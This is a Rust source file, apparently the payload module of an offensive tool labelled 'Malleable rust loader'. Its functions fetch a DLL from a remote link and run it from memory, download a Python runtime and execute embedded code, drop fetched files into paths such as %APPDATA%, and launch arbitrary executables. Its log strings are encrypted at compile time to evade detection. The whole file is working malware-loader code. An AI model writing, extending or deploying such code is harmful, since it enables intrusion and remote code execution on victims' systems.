#[cfg(target_os = "windows")]
use std::os::raw::c_int;
#[cfg(target_os = "windows")]
type DllEntryPoint = extern "C" fn() -> c_int;
#[cfg(target_os = "windows")]
use std::mem;

use serde::{Deserialize, Serialize};
//#[cfg(target_os = "linux")]
//use std::os::unix::fs::PermissionsExt;

use std::fs;
use std::io::Cursor;
use std::path::Path;
use std::path::PathBuf;
use std::process::Command;
use std::{thread, time};

#[cfg(target_os = "windows")]
use crate::embedder;

use log::debug;
use log::error;
use log::info;

use std::io::stdout;
use std::io::Write;

use crate::link::{Link, LinkFetch};

use cryptify::encrypt_string;

use anyhow::Result;

pub enum PayloadExec {
    NoThread(),
    Thread(thread::JoinHandle<()>, Payload),
}

//TODO remove the () and Empty
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Payload {
    DllFromMemory(DllFromMemory),
    //DownloadAndExec(DownloadAndExec),
    ExecPython(ExecPython),
    Banner(),
    WriteFile(WriteFile),
    Exec(Exec),
}
impl Payload {
    pub fn exec_payload(&self) -> PayloadExec {
        //TODO return all data
        let exec_result = match &self {
            Payload::DllFromMemory(payload) => payload.dll_from_memory(),
            //Payload::DownloadAndExec(payload) => payload.download_and_exec(),
            Payload::ExecPython(payload) => payload.deploy_embedder(),
            Payload::Banner() => banner(),
            Payload::WriteFile(payload) => payload.write_file(),
            Payload::Exec(payload) => payload.exec_file(),
        };
        //    Ok(PayloadExec::NoThread())
        match exec_result {
            Ok(a) => a,
            Err(e) => {
                error!("{}{}", encrypt_string!("exec error: "), e);
                PayloadExec::NoThread()
            }
        }
    }
    pub fn print_payload(&self) {
        debug!("{:#?}", self);
    }
    pub fn print_payload_compact(&self) {
        debug!("+{:?}", self);
    }
    pub fn is_same_payload(&self, other_payload: &Payload) -> bool {
        let self_serialized = serde_json::to_string(self).unwrap();
        let other_serialized = serde_json::to_string(other_payload).unwrap();
        self_serialized == other_serialized
    }
    pub fn is_already_running(
        &self,
        running_thread: &mut Vec<(thread::JoinHandle<()>, Payload)>,
    ) -> bool {
        for running_payload in &mut *running_thread {
            if self.is_same_payload(&running_payload.1) {
                info!("Payload is already running");
                return true;
            }
        }
        return false;
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DllFromMemory {
    pub link: Link,
    pub dll_entrypoint: String,
    pub thread: bool,
}

impl DllFromMemory {
    #[cfg(target_os = "linux")]
    pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
        error!("Its linux, impossible to run this payload: dll_from_memory");
        Ok(PayloadExec::NoThread())
        /*let dllthread = thread::spawn(move || {
            info!("hey");
        });
        Ok(PayloadExec::Thread(dllthread, Payload::DllFromMemory(self.clone())))
        */
    }

    #[cfg(target_os = "windows")]
    pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
        let data: Vec<u8> = self.link.fetch_data()?;

        if self.thread {
            let thread_dll_entrypoint = self.dll_entrypoint.clone();
            let dllthread = thread::spawn(move || {
                let dll_data: &[u8] = &data;

                info!("{}", encrypt_string!("Map DLL in memory"));
                let mm = memorymodule_rs::MemoryModule::new(dll_data);

                info!(
                    "{}{}",
                    encrypt_string!("Retreive DLL entrypoint: "),
                    &thread_dll_entrypoint
                );
                let dll_entry_point = unsafe {
                    mem::transmute::<_, DllEntryPoint>(mm.get_function(&thread_dll_entrypoint))
                };
                info!("{}", encrypt_string!("dll_entry_point()"));

                let result = dll_entry_point();
                debug!("{}{}", encrypt_string!("DLL result = "), result);
            });
            return Ok(PayloadExec::Thread(
                dllthread,
                Payload::DllFromMemory(self.clone()),
            ));
        } else {
            let dll_data: &[u8] = &data;
            info!("{}", encrypt_string!("Map DLL in memory"));
            let mm = memorymodule_rs::MemoryModule::new(dll_data);

            info!(
                "{}{}",
                encrypt_string!("Retreive DLL entrypoint: "),
                &self.dll_entrypoint
            );
            let dll_entry_point = unsafe {
                mem::transmute::<_, DllEntryPoint>(mm.get_function(&self.dll_entrypoint))
            };
            info!("{}", encrypt_string!("dll_entry_point()"));

            let result = dll_entry_point();
            debug!("{}{}", encrypt_string!("DLL result = "), result);
            return Ok(PayloadExec::NoThread());
        }
        //TODO quand on part d'ici, il y a un probleme
        //info!("{}", encrypt_string!("-> TODO repair unsafe"));
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ExecPython {
    pub link: Link,
    pub out_filepath: String,
    pub out_overwrite: bool,
    pub python_code: String,
    pub thread: bool,
}
impl ExecPython {
    #[cfg(target_os = "linux")]
    pub fn deploy_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
        error!(
            "{}",
            encrypt_string!("!Its linux, impossible to run this payload: deploy_embedder")
        );
        Ok(PayloadExec::NoThread())
    }

    #[cfg(target_os = "windows")]
    pub fn deploy_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
        let _ = self.download_and_unzip_python();
        info!(
            "{}{}\n",
            encrypt_string!("execute python with Embedder: "),
            &self.python_code
        );
        if self.thread {
            let thread_out_filepath = self.out_filepath.clone();
            let thread_python_code = self.python_code.clone();
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                embedder::embedder(&thread_out_filepath, &thread_python_code);
            });
            return Ok(PayloadExec::Thread(tj, Payload::ExecPython(self.clone())));
        } else {
            embedder::embedder(&self.out_filepath, &self.python_code);
            return Ok(PayloadExec::NoThread());
        }
    }

    pub fn download_and_unzip_python(&self) -> Result<(), anyhow::Error> {
        info!("{}", encrypt_string!("download_and_unzip_python"));
        let archive: Vec<u8> = self.link.fetch_data()?;
        let target_dir = PathBuf::from(&self.out_filepath); // Doesn't need to exist

        match zip_extract::extract(Cursor::new(archive), &target_dir, true) {
            Ok(_) => {}
            Err(error) => {
                error!(
                    "{}{}",
                    encrypt_string!("error to unzip python lib: "),
                    error
                )
            }
        }
        Ok(())
    }
}

pub fn banner() -> Result<PayloadExec, anyhow::Error> {
    let banner: &str = r#"
                                 ╓╖
                         , ▒╗,  ▒▒▒▒╖   ╓▒▒
  Malleable                ░░▒▒▒╖▒▒▒▒╣╣╖▒▒▒┐
 ┬─┐┬ ┬┌─┐┌┬┐        ▒▒@▒╓▒░░░░░░▒▒▒▒▒▒▒▒▒╢▓╖╓╓╖H┐
 ├┬┘│ │└─┐ │          ▒░░░░▒``▒░░░░░▒▒▒▒▒▒╢▒╢╢▒▒░`
 ┴└─└─┘└─┘ ┴   ,╓╓╓╥           ░░░░░░░▒▒▒▒▒▒▒▒▒╢╢
   LOADER      `  ▒`               ░░░░▒▒▒▒▒▒▒╢╢▒╣▒ÑH╗
                          ,▄       ░░░▒▒▒▒▒▒▒╢▒▒▒╢▒▒▒╜
               ╓╖       ╓  ██     ░▓``██▒▒▒▒▒▒▒╢▒╢╣╣
                │       █████▌   ░▐█,▄███▒▒░░▒▒▒▒╢╢╢@╖
                ╙▒      └███▀     └█████▌Ñ░░░▒▒▒▒╢╢╣▒▒░╣
                 .¿          ▄▄▄▄▄▄░"▀▀ `░░░▒▒╫╣╢╢╢╢╣╣╓▒▒
                     :``  ,, ╙████▀   ,  ░╫╬Ñ╜▒▒▒▒▒╣╢╫@▒╙▓╖
               ,░      ▒╢╫╢╢▓▒╜H   ░  ╨╨╜╙╙░  '▒▒╢▒▒▒╢▒╣▓▒▓▓╖
                  ▒ ░  ▒╙╢╢╢╢▓,               ` ░▒▒╢▒▒▒╢▒▓░╙╢N
               └╜▒▒@@  '░▒╢╣╢╢╣@,           ╓░▒ ▒░▒▒╢▒▒╣▒╢╣ ╙╙▒
                      ╙ ▒░▒╢╢╣╢▓╢╗              ▒╙░░▒╢▒╢╜╨╢▒
                        ╙▒░▒╢▒╣╣╣╨          ░ `  ░▒░║╣╢╜   `
                          "╨▒╜╢╢Ñ                  ░▒╜
                                                 ``a "#;

    info!("{}", encrypt_string!("BANNER"));
    let sleep_time = time::Duration::from_millis(3);
    for c in banner.chars() {
        print!("{}", c);
        let _ = stdout().flush();
        thread::sleep(sleep_time);
    }
    println!("");
    let sleep_time = time::Duration::from_millis(3000);
    thread::sleep(sleep_time);
    Ok(PayloadExec::NoThread())
}

/*
fn random_string() -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ\
                            abcdefghijklmnopqrstuvwxyz\
                            0123456789";
    const PASSWORD_LEN: usize = 30;
    let mut rng = rand::thread_rng();

    let out_str: String = (0..PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect();
    out_str
}

pub fn basename(out_filepath: &String) -> String {
    let path = Path::new(out_filepath);
    let filename = path.file_name().unwrap();
    filename.to_str().unwrap().to_string()
}
*/

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct WriteFile {
    pub link: Link,
    pub path: String,
    pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
                      //pub out_overwrite: bool,
                      //random name... mais il faut trouver un moyen pour passer la value aux payloads suivantes.
}
use std::fs::File;
//use std::io::Write;
use std::fs::create_dir_all;
//use std::path::Path;
use shellexpand;

use chksum_sha2_512 as sha2_512;

//use std::io;
use std::io::prelude::*;
//use std::fs::File;

pub fn same_hash_sha512(hash: &String, path: &PathBuf) -> bool {
    if *hash == "".to_string() {
        return false;
    }

    let mut f = match File::open(path) {
        Ok(f) => f,
        Err(_) => return false,
    };
    let mut buffer: Vec<u8> = Vec::new();

    // read the whole file
    match f.read_to_end(&mut buffer) {
        Ok(_) => (),
        Err(_) => return false,
    };
    let digest = sha2_512::chksum(buffer).unwrap();

    digest.to_hex_lowercase() == *hash
}

impl WriteFile {
    pub fn write_file(&self) -> Result<PayloadExec, anyhow::Error> {
        //TODO verify if file already exist and calculate hash before replacing it.
        let path: PathBuf = calculate_path(&self.path)?;

        if same_hash_sha512(&self.hash, &path) == false {
            let _ = create_diretory(&path)?;

            let body: Vec<u8> = self.link.fetch_data()?;

            info!("[+] Write file: {:?}", path);
            let mut f = File::create(&path)?;
            f.write_all(&body)?;
        } else {
            info!("[+] No Write, same hash: {:?}", path);
        }
        Ok(PayloadExec::NoThread())
    }
}

pub fn calculate_path(path_with_env: &String) -> Result<PathBuf, anyhow::Error> {
    let expanded = shellexpand::env(path_with_env)?; // Expands %APPDATA% or any other environment variable
    let path: &Path = Path::new(&*expanded); // Convert to a Path
    debug!("Expanded Path: {:?}", path);
    Ok(path.to_owned())
}

pub fn create_diretory(path: &PathBuf) -> Result<(), anyhow::Error> {
    match path.parent() {
        Some(parent_dir) => {
            if fs::metadata(parent_dir).is_ok() == false {
                info!("[+] path not exist, create: {:?}", parent_dir);
                create_dir_all(parent_dir)?;
            }
        }
        None => error!(
            "{}{:?}",
            encrypt_string!("error, impossible to retreive parent path: "),
            path
        ),
    };
    Ok(())
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Exec {
    pub path: String,
    pub cmdline: String,
    pub thread: bool,
}
impl Exec {
    // https://doc.rust-lang.org/std/process/struct.Command.html
    pub fn exec_file(&self) -> Result<PayloadExec, anyhow::Error> {
        let path: PathBuf = calculate_path(&self.path)?;
        info!("Exec {:?} {}", &path, &self.cmdline);
        let mut comm = Command::new(&path);

        //TODO add exec privs if linux

        for i in self.cmdline.trim().split_whitespace() {
            comm.arg(i);
        }
        if self.thread {
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                let mut c = comm
                    .spawn()
                    .expect(&encrypt_string!("failed to execute process"));
                let _ = c.wait();
            });
            return Ok(PayloadExec::Thread(tj, Payload::Exec(self.clone())));
        } else {
            let _output: std::process::Output = comm
                .output()
                .expect(&encrypt_string!("failed to execute process"));
            //let _hello: Vec<u8> = output.stdout;
            return Ok(PayloadExec::NoThread());
        };
    }
}
